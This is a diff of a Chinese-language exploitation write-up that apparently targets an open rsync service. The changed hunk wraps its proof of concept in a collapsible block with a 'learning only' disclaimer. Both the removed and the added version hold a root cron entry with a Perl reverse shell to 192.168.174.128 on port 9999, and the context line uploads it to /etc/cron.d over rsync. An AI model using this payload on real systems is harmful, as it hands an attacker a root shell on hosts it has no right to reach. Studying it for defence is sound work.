@@ -60,11 +60,14 @@ rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell
 
 shell文件内容如下：
 
-```
-# 此处指定用户root不可省略
-* * * * * root perl -e 'use Socket;$i="192.168.174.128";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
-```
+<pre><code class="language-text"># 此处指定用户root不可省略
+* * * * * root perl -e 'use Socket;$i="192.168.174.128";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");&#101;xec("/bin/sh -i");};'
+</code></pre>
+
+</details>
 
 上传shell文件触发反弹shell：
 
